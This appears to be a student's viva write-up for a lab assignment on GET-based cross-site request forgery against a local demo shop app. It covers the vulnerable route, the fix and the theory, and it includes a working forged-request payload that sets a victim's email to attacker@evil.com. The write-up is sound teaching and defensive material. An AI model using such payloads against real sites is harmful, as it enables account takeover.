# CSRF Variant 1 (GET-based forged action) - Viva Write-up

Target action: forcing a change to a logged-in user's account email on
**ShopBase** (a state change that enables full account takeover via password
reset). File: `app/server.js`. Attacker page: `attacker/evil.html`.

---

## (a) Vulnerable implementation - the exact code path

In `app/server.js`, the route that handles the email change:

```js
// GET /account/update-email?email=...
if (req.method === 'GET' && path === '/account/update-email') {
  const user = currentUser(req);              // identified ONLY by the session cookie
  if (!user) return send(res, 401, ...);
  // (no CSRF check in vulnerable mode)
  const newEmail = u.searchParams.get('email');
  user.email = newEmail;                      // <-- the state change
  return send(res, 200, ...);
}
```

The flaw: a **state-changing action is performed on a GET request**, authorised
by nothing but the automatically-sent session cookie. There is no CSRF token,
no check of the HTTP method, and no Origin/Referer check.

---

## (b) Working exploit - the exact request

The attacker page `attacker/evil.html` (served from `http://localhost:4000`, a
different origin) fires the request when the victim clicks "Claim reward":

```js
new Image().src =
  'http://localhost:3000/account/update-email?email=attacker@evil.com';
```

The browser sends this cross-site request, attaching the victim's ShopBase
cookie automatically:

```
GET /account/update-email?email=attacker@evil.com HTTP/1.1
Host: localhost:3000
Cookie: sid=<victim's ShopBase session>
```

Result: the logged-in victim's email silently becomes `attacker@evil.com`.
(An `<img src="...">` tag firing on page load is an equivalent payload; the
click-triggered `Image()` is the same forged GET, just wrapped in a believable
"reward claimed" flow.)

---

## (c) Root cause (one line)

A **state-changing request is accepted with no proof of intent** - the session
cookie proves which account the browser is signed into, but not that the user
intended this particular request; and because it is a GET, any other site can
trigger it with an `<img>` tag or one line of JavaScript.

---

## (d) Mitigation implemented - synchronizer (anti-CSRF) token

Run with `SECURE=1`. Two parts in `app/server.js`:

1. A secret token is created per session at login and embedded in ShopBase's
   own change-email form:
   ```js
   sessions[sid] = { username, csrfToken: crypto.randomBytes(16).toString('hex') };
   // ...in the form:
   <input type="hidden" name="csrf" value="<that token>">
   ```
2. The endpoint rejects any request whose token does not match the session's:
   ```js
   if (u.searchParams.get('csrf') !== getSession(req).data.csrfToken) {
     return send(res, 403, '...Request blocked - CSRF token missing or invalid...');
   }
   ```

Running the **same** exploit now returns **HTTP 403** and the email is
unchanged - because the attacker's page cannot read or guess the token (the
same-origin policy stops `evil.com` reading anything off a `localhost:3000`
page). Screenshot the 403 "Request blocked" page as evidence.

---

## (e) Other mitigations (theory)

For CSRF, besides the synchronizer token implemented above, the slides list:

- **SameSite cookies** - marking the session cookie `SameSite=Lax` or `Strict`
  tells the browser not to send it on cross-site requests, so the forged
  request arrives unauthenticated. (`Lax` still permits top-level GET
  navigations, so it is weaker than `Strict` for GET-based actions.)
- **Re-authentication for sensitive actions** - requiring the password or a
  second factor before a critical change; the attacker cannot supply that
  secret, so a silent forged request cannot complete.
- **Avoiding state-changing GET requests** - using POST/PUT/DELETE for changes.
  This does not stop CSRF by itself (a POST is forgeable with an auto-submitting
  form, which is Variant 2), but it removes the trivial `<img>`/`Image()` vector
  and lets the token travel in the request body rather than a loggable URL.

Each works by restoring the missing guarantee: either the forged request no
longer carries the user's authenticated session (SameSite), or it cannot carry
the per-session secret the server now demands (token, re-auth).

> The assignment's reference list also names mitigations for SQL injection,
> command injection and XSS. Those are for the other three variants; CSRF is the
> relevant one here.

---

## Likely viva questions (be ready to defend)

- **Why is using GET the problem?** GET is auto-triggered by the browser
  (`<img>`, `<script>`, a plain link), so a forged GET needs no victim action
  beyond loading a page.
- **Why does the cookie get sent to ShopBase from evil.com?** Browsers attach a
  site's cookies to every request to that site, regardless of which page
  initiated it. That is exactly what CSRF abuses.
- **Can the attacker read the result / the token?** No - the same-origin policy
  blocks `evil.com` from reading ShopBase's responses or page contents. CSRF can
  only *trigger* actions, not read data; that is why it targets state changes.
- **How is CSRF different from XSS?** XSS runs attacker script *on the target
  site*; CSRF runs no script on the target, it only makes the browser *send* a
  request.
- **Why does the token stop it but the cookie doesn't?** The cookie is sent
  automatically (so the attacker gets it for free); the token lives in the page
  body and is readable only by same-origin script, so the attacker cannot
  include it.

---

## Reference map (exact file:line)

**app/server.js** (252 lines)

| What | Line(s) |
|------|---------|
| Login route; issues session + CSRF token | 169, token created at **174** |
| Account page route | 185 |
| Current email shown on account page (`id="email"`) | 215 |
| Change-email form (method=GET -> the weak design) | 218 |
| Hidden CSRF token field (only added in SECURE mode) | 220 |
| **(a)** Vulnerable endpoint handler starts | 230 |
| User identified from cookie only (`currentUser`) | 231 |
| **(d)** Mitigation: SECURE synchronizer-token check | 233-235 |
| **(d)** 403 "Request blocked" response | 236 |
| Reads `email` from query string | 241 |
| **(a/c)** The state change (`user.email = newEmail`) | 243 |

**attacker/evil.html**

| What | Line(s) |
|------|---------|
| "Claim reward" button (`onclick="claim()"`) | 66 |
| `claim()` function | 95 |
| **(b)** The forged request (`new Image().src = ...update-email?...`) | 97-98 |

**attacker/attacker-server.js**

| What | Line(s) |
|------|---------|
| Attacker origin port 4000 | 15 |
| Serves evil.html | 20 |

Mapping to Table 2:
- **(a)** server.js **230, 241, 243** (state change on GET, cookie-only auth at 231)
- **(b)** evil.html **66, 95-98**; served cross-origin by attacker-server.js **15**
- **(c)** server.js **230 + 243** (GET at form line **218**) - state change, no intent check
- **(d)** server.js **174** (token issued), **220** (token in form), **233-236** (enforced -> 403)
- **(e)** theory only (section e above) - no code
